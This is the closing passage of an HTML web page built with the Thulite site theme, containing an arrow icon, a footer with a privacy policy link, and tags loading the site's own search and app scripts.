					<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
						<path d="M5 12l14 0"></path>
						<path d="M13 18l6 -6"></path>
						<path d="M13 6l6 6"></path>
					</svg>
				</div>
			</div>
		</div>
	</div>

			
		</main>
		
	</div>

      
      </div>
    </div>
    
    
    <footer class="footer text-muted">
  <div class="container-lg">
    <div class="row">
      <div class="col-lg-8 text-center text-lg-start">
        <ul class="list-inline">
          <li class="list-inline-item"><a class="text-muted" href="/privacy/">Privacy Policy</a></li>
        </ul>
      </div>
      <div class="col-lg-8 text-center text-lg-end">
        <ul class="list-inline">
          <li class="list-inline-item">Brought to you by <a class="text-muted" href="https://thulite.io/">Thulite</a></li>
        </ul>
      </div>
    </div>
  </div>
</footer>

    

<script async
  src="/js/app.249127ac97fccea7237e5990340629c63da5a555a7c4a120cf11a5113ea5e96e.js"
  integrity="sha256-JJEnrJf8zqcjflmQNAYpxj2lpVWnxKEgzxGlET6l6W4=">
</script>





<script async
  src="/js/flexsearch.be33aab3067e96554f261851c25a593228b91154cd28ff5c7f8d52b2e7f306d2.js"
  integrity="sha256-vjOqswZ&#43;llVPJhhRwlpZMii5EVTNKP9cf41SsufzBtI=">
</script>
<script async
  src="/js/search-modal.97d606e77f08deeb37876860d99c8f6813ef29263e73b6435c252de6be98d55e.js"
  integrity="sha256-l9YG538I3us3h2hg2ZyPaBPvKSY&#43;c7ZDXCUt5r6Y1V4=">
</script>

    
  </body>
</html>